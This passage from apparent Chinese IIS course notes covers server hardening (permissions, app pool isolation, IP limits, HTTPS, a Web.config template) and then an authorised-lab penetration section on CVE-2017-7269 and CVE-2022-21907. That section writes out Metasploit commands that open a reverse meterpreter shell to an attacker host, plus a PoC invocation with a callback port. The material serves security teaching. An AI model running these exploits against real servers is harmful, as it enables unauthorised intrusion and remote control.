    ↓ NTFS权限控制 + 应用程序池隔离
[第二层] 访问控制 —— 谁能访问
    ↓ IP白名单/黑名单
[第三层] 传输安全 —— HTTPS加密
    ↓ 证书 → 443绑定 → HTTP→HTTPS重定向
[第四层] 统一配置与上线检查
    ↓ Web.config高级模板 + 综合检查清单
```

---

### 第一层：权限控制——最小权限原则

IIS 访问控制涉及**两层权限**，必须同时满足才能正常访问：

| 权限层 | 控制什么 | 关键账户 |
| --- | --- | --- |
| **HTTP 身份验证** | 哪些用户可通过 HTTP 访问 | IUSR（匿名）、Windows 域账户 |
| **NTFS 文件系统** | 工作进程对磁盘文件的读写 | IIS_IUSRS 组、应用程序池标识 |

**核心账户：**

- `IUSR`：IIS 匿名访问账户
- `IIS_IUSRS`：工作进程组，网站目录至少需**读取和执行**权限
- `IIS AppPool\{池名}`：每个池的独立虚拟账户（**最小权限原则**）

**应用程序池——IIS 安全隔离的核心机制：**

每个网站应使用**独立应用程序池**，实现进程级隔离：

```
网站A → 应用程序池A（独立虚拟账户）→ w3wp.exe（进程A）
网站B → 应用程序池B（独立虚拟账户）→ w3wp.exe（进程B）
```

| 标识类型 | 安全性 | 推荐场景 |
| --- | --- | --- |
| **ApplicationPoolIdentity** | ⭐⭐⭐⭐⭐（权限最小） | ✅ 所有生产环境 |
| NetworkService | ⭐⭐⭐ | 需跨网络资源时 |
| LocalSystem | ⭐（等同管理员） | ❌ 严禁使用 |

> ⚠️ 切勿使用 `LocalSystem`——一旦 Web 应用被攻破，攻击者直接获得管理员权限。这与”最小权限原则”完全相悖。
> 

**为什么独立应用程序池这么重要？** 与任务三的日志分析直接相关：如果两个网站共享一个池，其中一个被攻破，攻击者可以通过工作进程访问**同一池内所有网站的文件**。独立池确保了”一处被攻破，不会波及其他”。

---

### 第二层：访问控制——IP 限制

与任务三中的”日志发现攻击 IP → 手动加入黑名单”不同，本层是**事前配置**——在攻击发生之前就限制谁能访问：

- **白名单模式**：默认拒绝所有，仅允许指定 IP 段（适合管理后台、内网测试站）
- **黑名单模式**：默认允许所有，仅拒绝已知恶意 IP（适合公开站点）

> ⚠️ 使用白名单模式时，务必先把自己的 IP 加入允许列表，否则会把自己锁在外面！
> 

---

### 第三层：传输安全——HTTPS

任务三中的安全响应头（如 `Strict-Transport-Security`）需要 HTTPS 环境才能生效。本层解决传输加密问题。

| 对比维度 | HTTP | HTTPS |
| --- | --- | --- |
| 数据传输 | 明文，可被抓包 | SSL/TLS 加密 |
| 默认端口 | 80 | 443 |
| 证书 | 无 | 需 SSL/TLS 证书 |

**证书类型：** 自签名（测试/内网）→ DV（Let’s Encrypt 免费）→ OV（企业付费）→ EV（金融，严格验证）

**HTTPS 配置三步走：**

```
① 获取SSL证书 → ② 添加443端口绑定 → ③ 配置HTTP→HTTPS自动重定向
     （本层操作5）       （本层操作5）          （本层操作6）
```

步骤③需要安装 **URL Rewrite 模块**，在 Web.config 中配置重写规则，让浏览器自动从 HTTP 跳转到 HTTPS。配置后，`Strict-Transport-Security`（HSTS）响应头才会真正生效——浏览器收到 HSTS 后，在指定时间内会自动强制使用 HTTPS，防止 SSL 剥离攻击。

---

### 第四层：Web.config 高级模板与上线检查

任务三的 Web.config 模板覆盖了前三层防御（响应头+请求筛选+错误页），任务四的模板在此基础上增加：

- **HSTS**（强制 HTTPS）
- **Referrer-Policy**（控制来源信息泄露）
- **Permissions-Policy**（禁用不需要的浏览器 API）
- **HTTP→HTTPS 重定向规则**
- **双编码拒绝**（防止绕过请求筛选）

最终形成一份**完整的纵深防御配置文件**，覆盖两个任务的所有安全配置。

---

## 🛠️ 实践操作

### 操作1：NTFS 文件权限配置（第一层）

1. 文件资源管理器 → 右键网站目录 →「属性」→「安全」选项卡
2. 点击「编辑」→「添加」→ 输入 `IIS AppPool\{应用程序池名}` → 确定
3. 权限只勾选「**读取和执行**」「**列出文件夹内容**」「**读取**」，**不勾选写入**

> 💡 **常见问题：** 网站迁移到新目录后出现 403 → 日志显示 `401.3` → 原因是新目录缺少应用程序池标识的读取权限 → 按上述步骤添加即可。
> 
> 
> ❌ 不要给 `Everyone` 完全控制，正确做法是只给应用程序池标识最小必要权限。
> 

---

### 操作2：限制 HTTP 请求方法（第一层→与任务三第二层衔接）

IIS管理器 → 选中网站 → 双击「请求筛选」→「HTTP谓词」选项卡 → 点击「拒绝谓词」→ 依次添加：

`TRACE`、`OPTIONS`、`PUT`、`DELETE`、`PATCH`

> 这是对任务三”请求筛选”的补充——任务三限制了扩展名和 URL 长度，这里限制 HTTP 方法，两者共同构成完整的请求筛选体系。
> 

---

### 操作3：IP 访问限制（第二层）

IIS管理器 → 选中网站 → 双击「IP地址和域限制」：

1. 右侧「编辑功能设置」→ 将「未指定的客户端的访问」改为「**拒绝**」（默认拒绝所有）
2. 右侧「添加允许条目」→ 选择「IP地址范围」→ 如 `192.168.1.0/255.255.255.0`
3. 添加本机 `127.0.0.1`

---

### 操作4：应用程序池安全加固（第一层）

选中应用程序池 → 右侧「高级设置」：

| 配置项 | 建议值 | 说明 |
| --- | --- | --- |
| 标识 | `ApplicationPoolIdentity` | 权限最小，生产环境必选 |
| 启动模式 | `AlwaysRunning` | 保持始终运行 |
| 空闲超时 | `0`（禁用） | 防止被意外回收 |
| 最大工作进程数 | `1` | 静态站设 1 即可 |
| 快速故障保护 | `True`（5次/5分钟） | 连续崩溃后自动停止，防止雪崩 |
| CPU 限制 | `80000`（80%） | 防止单池占过多资源 |

---

### 操作5：配置 SSL 证书与 HTTPS 绑定（第三层）

> **常见问题：443 端口被 WAC 占用怎么办？**
> 
> 
> Windows Admin Center（WAC）在 Windows Server 上默认监听 443 端口，会与 IIS 的 HTTPS 绑定冲突。解决方法是将 WAC 改到其他端口（如 6516）。
> 
> **WAC v2 修改步骤：**
> 
> 1. 打开 WAC 配置文件 `%PROGRAMFILES%\Windows Admin Center\appsettings.json`
> 2. 找到并修改以下两处 `443` → `6516`（或其他未占用端口）：
> 
> ```json
> // Kestrel 节点中
> "Url":  "https://*:443"          →  "Url":  "https://*:6516"
> 
> // HttpSysUrls 中
> "HttpSysUrls": ["https://+:443"] → "HttpSysUrls": ["https://+:6516"]
> ```
> 
> 1. 防火墙放行新端口：
> 
> ```powershell
> New-NetFirewallRule -DisplayName "WAC 6516" -Direction Inbound -Protocol TCP -LocalPort 6516 -Action Allow
> ```
> 
> 1. 重启 WAC 服务：
> 
> ```powershell
> Restart-Service WindowsAdminCenter
> ```
> 
> 1. 验证：`netstat -ano | findstr ":443" | findstr "LISTENING"` 无输出即表示 443 已释放。通过 `https://服务器IP:6516` 访问 WAC。
> 
> WAC v1 则通过「设置 → 应用 → 已安装的应用 → Windows Admin Center → 修改」来改端口。
> 

**步骤一：创建自签名证书**

IIS管理器 → 选中**服务器节点** → 双击「服务器证书」→「创建自签名证书」→ 友好名称如 `MySite-SSL`

**步骤二：添加 HTTPS 绑定**

选中网站 → 右侧「绑定…」→「添加」→ 类型 `https`、端口 `443`、SSL 证书选刚创建的 → 确定

确认绑定列表同时存在 HTTP（80）和 HTTPS（443）两条记录。

**步骤三：验证**

浏览器访问 `https://域名` → 自签名证书会有安全警告，点击「高级」→「继续访问」。生产环境应使用 CA 签发证书。

---

### 操作6：Web.config 高级安全配置（第四层）

### 6.1 HTTP→HTTPS 重定向

IIS 实现 HTTP→HTTPS 跳转有两种方式：

**方式一：IIS 原生「HTTP 重定向」（无需安装额外模块，适合单站点）**

IIS管理器 → 选中网站 → 双击「**HTTP 重定向**」：

1. ✅ 勾选「**将请求重定向到此目标**」，输入框填写 `https://你的域名/`（或 `https://你的域名$S$Q` 保留路径和查询参数）
2. ❌ 不勾选「将所有请求重定向到确切的目标」（不勾选才能保留原始路径）
3. ❌ 不勾选「仅将请求重定向到目录」
4. 状态码下拉改为 `301 永久重定向`（默认是 302）
5. 点击右侧「应用」

> 💡 原生重定向只支持 IIS 自有变量（`$S` 路径、`$Q` 查询串、`$V` 完整URL），**不支持** `{HTTP_HOST}`、`{R:1}` 等 URL Rewrite 语法，域名需写死。多域名自适应需用方式二。
> 

**方式二：URL Rewrite 模块（支持正则等复杂规则，适合多站点/精细控制）**

IIS 默认不包含此模块，需先安装：

```powershell
# 方式A：通过 Web 平台安装器（推荐）
# 下载地址：https://www.iis.net/downloads/microsoft/web-platform-installer
# 安装后搜索 "URL Rewrite" → 添加

# 方式B：直接下载安装
# 下载地址：https://www.iis.net/downloads/microsoft/url-rewrite
```

安装后刷新 IIS 管理器，网站功能视图中会出现「**URL 重写**」图标。配置方法：

IIS管理器 → 选中网站 → 双击「URL 重写」→「添加规则」→「空白规则」→ 配置：

| 项目 | 值 |
| --- | --- |
| 名称 | `RedirectToHTTPS` |
| 匹配 URL 模式 | `(.*)`（正则表达式） |
| 条件 | `{HTTPS}` 与模式 `^OFF$` 匹配 |
| 操作 | 重定向到 `https://{HTTP_HOST}/{R:1}`，301 永久 |

**方式一的 Web.config 写法：**

```xml
<system.webServer>
  <httpRedirect enabled="true" destination="https://你的域名$S$Q"
                 exactDestination="false" childOnly="false" httpResponseStatus="Permanent" />
</system.webServer>
```

**方式二的 Web.config 写法：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- 第三层：HTTP → HTTPS 自动重定向 -->
    <rewrite>
      <rules>
        <rule name="Redirect to HTTPS" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}/{R:1}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    <!-- 第三层：安全响应头（含 HSTS） -->
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-XSS-Protection" value="1; mode=block" />
        <add name="Referrer-Policy" value="strict-origin-when-cross-origin" />
        <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains" />
      </customHeaders>
    </httpProtocol>
  </system.webServer>
</configuration>
```

> 验证：访问 `http://域名` → 应自动跳转到 `https://域名`（F12 Network 可看到 301 响应）。
> 

**完整纵深防御 Web.config 模板（任务三+任务四全部配置）：**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <!-- 任务三·第三层：安全响应头 -->
    <httpProtocol>
      <customHeaders>
        <remove name="X-Powered-By" />
        <remove name="Server" />
        <add name="X-Frame-Options" value="SAMEORIGIN" />
        <add name="X-Content-Type-Options" value="nosniff" />
        <add name="X-XSS-Protection" value="1; mode=block" />
        <add name="Referrer-Policy" value="strict-origin-when-cross-origin" />
        <add name="Permissions-Policy" value="geolocation=(), microphone=(), camera=()" />
        <add name="Strict-Transport-Security" value="max-age=31536000; includeSubDomains" />
      </customHeaders>
    </httpProtocol>
    <!-- 任务三·第二层：请求筛选 -->
    <security>
      <requestFiltering>
        <verbs allowUnlisted="true">
          <add verb="TRACE" allowed="false" />
          <add verb="TRACK" allowed="false" />
          <add verb="OPTIONS" allowed="false" />
          <add verb="PUT" allowed="false" />
          <add verb="DELETE" allowed="false" />
          <add verb="PATCH" allowed="false" />
        </verbs>
        <fileExtensions allowUnlisted="true">
          <add fileExtension=".config" allowed="false" />
          <add fileExtension=".bat" allowed="false" />
          <add fileExtension=".cmd" allowed="false" />
          <add fileExtension=".exe" allowed="false" />
          <add fileExtension=".ps1" allowed="false" />
          <add fileExtension=".bak" allowed="false" />
          <add fileExtension=".log" allowed="false" />
          <add fileExtension=".inc" allowed="false" />
        </fileExtensions>
        <requestLimits maxUrl="4096" maxQueryString="2048" />
        <denyDoubleEncoding enabled="true" />
      </requestFiltering>
    </security>
    <!-- 任务三·第三层：自定义错误页 -->
    <httpErrors errorMode="DetailedLocalOnly" existingResponse="Replace">
      <remove statusCode="404" />
      <remove statusCode="403" />
      <remove statusCode="500" />
      <error statusCode="404" path="/errors/404.html" responseMode="ExecuteURL" />
      <error statusCode="403" path="/errors/403.html" responseMode="ExecuteURL" />
      <error statusCode="500" path="/errors/500.html" responseMode="ExecuteURL" />
    </httpErrors>
    <!-- 任务三·第三层：禁用目录浏览 -->
    <directoryBrowse enabled="false" />
    <!-- 任务四·第三层：HTTP → HTTPS 重定向（配置SSL后启用） -->
    <!--
    <rewrite>
      <rules>
        <rule name="Redirect to HTTPS" stopProcessing="true">
          <match url="(.*)" />
          <conditions>
            <add input="{HTTPS}" pattern="^OFF$" />
          </conditions>
          <action type="Redirect" url="https://{HTTP_HOST}/{R:1}" redirectType="Permanent" />
        </rule>
      </rules>
    </rewrite>
    -->
  </system.webServer>
</configuration>
```

> 注意模板中的注释标注了每项配置属于”任务几的第几层”，方便理解纵深防御中每个配置的位置和作用。
> 

---

### 操作7：综合安全加固检查清单（第四层）

以下清单将两个任务的**全部防御层**整合为一份”上线前必检”列表：

| # | 防御层 | 检查项 | 验证方法 |
| --- | --- | --- | --- |
| 1 | 任务四·第一层 | 独立应用程序池，标识为 ApplicationPoolIdentity | 应用程序池列表 |
| 2 | 任务四·第一层 | NTFS 最小权限（仅读取+执行） | 目录属性→安全 |
| 3 | 任务三·第三层 | 禁用目录浏览 | 访问 `/images/` 应返回 403 |
| 4 | 任务三·第三层 | 安全响应头，无 X-Powered-By | F12 → Response Headers |
| 5 | 任务三·第二层 | HTTP 方法限制 | 请求筛选→HTTP谓词 |
| 6 | 任务三·第二层 | 文件扩展名限制 | 请求筛选→文件名扩展名 |
| 7 | 任务三·第三层 | 自定义错误页 | 访问不存在的页面 |
| 8 | 任务四·第二层 | IP 访问限制 | IP地址和域限制 |
| 9 | 任务四·第三层 | HTTPS 绑定 | 网站绑定列表 |
| 10 | 任务四·第三层 | HTTP→HTTPS 跳转 | 访问 `http://` 自动 301 |

> **时间有限时优先检查：** ① 应用程序池标识 ② 目录浏览 ③ 请求筛选 ④ HTTPS 绑定
> 

---

## 📝 任务四知识点总结

> **一句话**：任务四从”被动防御”升级到”主动防御”——通过权限控制限制文件访问、通过应用程序池实现进程隔离、通过 IP 限制控制访问来源、通过 HTTPS 加密传输通道，最终用 Web.config 将两个任务的所有安全配置整合为一份完整的纵深防御模板。
> 

**任务三+任务四完整防御体系总览：**

```
请求流入 → [日志审计] → [请求筛选] → [安全响应头] → [Web.config统一管理]
              任务三        任务三         任务三          任务三+四
                    ↓                               ↑
              [权限控制] → [访问控制] → [HTTPS加密] ──┘
                任务四        任务四       任务四
```

| 层 | 任务 | 做什么 | 解决什么问题 |
| --- | --- | --- | --- |
| 日志审计 | 三 | 记录请求、分析异常 | 看得见问题 |
| 请求筛选 | 三+四 | 限制方法/扩展名/URL长度 | 拦截恶意请求 |
| 安全响应头+错误页 | 三 | 隐藏服务器信息 | 减少攻击面 |
| 权限控制 | 四 | NTFS最小权限+应用池隔离 | 限制文件访问 |
| IP限制 | 四 | 白名单/黑名单 | 控制访问来源 |
| HTTPS | 四 | 证书+绑定+重定向 | 加密传输 |
| Web.config | 三+四 | 一份文件承载全部配置 | 统一管理 |

---

# 📚 项目四知识点总结（任务一至任务四）

四个任务构成一条完整的学习链：**安装 → 部署 → 被动防御 → 主动加固**。

```
任务一·安装           任务二·部署            任务三·被动防御           任务四·主动加固
安装 IIS             创建网站 / 绑定         日志审计（看得见）         权限控制（隔离）
认识架构             虚拟主机 / 默认文档      请求筛选（拦得住）         IP 限制（过滤）
管理器 + PS          自定义 404 / config     安全响应头（不泄露）       HTTPS 加密（护）
                                           Web.config 统一管理        纵深防御模板
```

| 任务 | 定位 | 核心产出 |
| --- | --- | --- |
| 任务一 | 基础 | IIS 安装 + 架构认知（HTTP.sys → WAS → 应用程序池 → w3wp.exe） |
| 任务二 | 部署 | 静态网站上线（绑定三要素、虚拟主机、默认文档、自定义错误页） |
| 任务三 | 被动防御 | 纵深防御前三层：日志审计 → 请求筛选 → 安全响应头，Web.config 统一管理 |
| 任务四 | 主动防御 | 纵深防御后三层：权限控制 → IP 限制 → HTTPS 加密，输出完整安全模板 |

> **一句话总结**：从任务一的”搭起来”到任务四的”锁起来”，四个任务覆盖了 IIS 站点的**完整生命周期**。任务三+四的纵深防御体系是核心——日志发现问题、请求筛选拦截攻击、响应头减少暴露、权限控制限制访问、HTTPS 加密通道，所有配置最终收敛到一份 Web.config 文件中。
> 

---

# 任务五 Windows IIS服务渗透（拓展）

🔗

**知识衔接**：经过前四个任务的学习，我们已经从”安装 IIS → 部署网站 → 日志监控 → 安全加固”完成了完整的建站与防护流程。任务五则是这一链条的**逆向思考**：了解攻击者如何利用 IIS 历史上的真实漏洞（缓冲区溢出、路径穿越、WebDAV攻击链等），从而更深层次地理解前面各项加固措施的实际防护价值——“知攻”是”知防”的前提，也是安全意识培养的关键环节。

⚠️

**声明**：本任务内容仅用于授权环境下的安全研究与教学演示。严禁对未经授权的系统进行任何渗透测试行为，违者依法承担法律责任。

## 🧠 理论知识

### IIS的安全脆弱性

IIS历史上存在多个严重漏洞，主要类型包括：

- **缓冲区溢出**：处理请求时溢出导致代码执行
- **路径穿越**：访问web根目录以外的文件
- **WebDAV漏洞**：WebDAV扩展引发的多个安全问题
- **NTLM哈希泄露**：通过UNC路径注入

---

### CVE-2017-7269（IIS 6.0 WebDAV缓冲区溢出）

| 属性 | 内容 |
| --- | --- |
| 影响版本 | Windows Server 2003 R2，IIS 6.0（已停止支持） |
| 漏洞类型 | 缓冲区溢出（堆溢出） |
| 触发条件 | 启用了WebDAV服务 |
| 危害 | 远程代码执行 |
| CVSS评分 | 9.8（严重） |

**漏洞原理**：IIS 6.0的WebDAV服务在处理过长的 `If` 请求头时发生缓冲区溢出，攻击者可以远程执行任意代码。由于Windows Server 2003已于2015年停止支持，此系统不再获得安全更新。

**防御措施**：停用WebDAV功能（`Uninstall-WindowsFeature Web-DAV-Publishing`），升级至受支持的操作系统版本。

---

### CVE-2022-21907（HTTP协议栈远程代码执行）

| 属性 | 内容 |
| --- | --- |
| 影响版本 | Windows Server 2019/2022, Windows 10/11 |
| 组件 | HTTP.sys（Windows内核HTTP驱动） |
| 漏洞类型 | HTTP Trailer Support功能边界错误 |
| 危害 | 远程代码执行（蠕虫级，无需用户交互） |
| CVSS评分 | 9.8（严重） |
| 修复补丁 | KB5009546（2022年1月安全更新） |

**漏洞原理**：HTTP.sys在处理带有 `Trailer` 头的HTTP请求时存在越界写漏洞，攻击者仅需发送特制HTTP请求即可触发，不需要任何认证。

**防御措施**：立即安装KB5009546补丁；临时缓解可禁用HTTP Trailer支持：

```powershell
# 临时缓解：禁用HTTP Trailer支持（需重启HTTP服务）
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\HTTP\Parameters" `
    -Name "EnableTrailerSupport" -Value 0 -Type DWORD
Restart-Service -Name "HTTP"

# 验证补丁安装
Get-HotFix -Id KB5009546
```

> 🆕 **近年IIS/Web服务相关安全补充**：
> 

> • **CVE-2023-36036**（Windows Cloud Files Mini Filter Driver EoP）：可与IIS漏洞组合形成攻击链
> 

> • **现代Web安全配置推荐**：启用HSTS、配置CSP策略头、使用Azure WAF或ModSecurity、定期使用OWASP ZAP进行Web漏洞扫描
> 

---

## 🛠️ 实践操作

### WebDAV CVE-2017-7269漏洞复现

```bash
# 使用Metasploit（需靶机运行Windows Server 2003 + IIS 6.0 + WebDAV开启）
msfconsole
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
set RHOSTS 192.168.100.20
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit
```

### CVE-2022-21907漏洞复现

```bash
# 需要靶机：Windows Server 2019/2022（未打补丁）
# 使用PoC脚本发送特制HTTP请求
python3 CVE-2022-21907.py --target http://192.168.100.20 --lhost 192.168.100.10 --lport 4444

# 防御验证：安装补丁后测试是否仍然可利用
# 检查补丁：Get-HotFix -Id KB5009546
```

---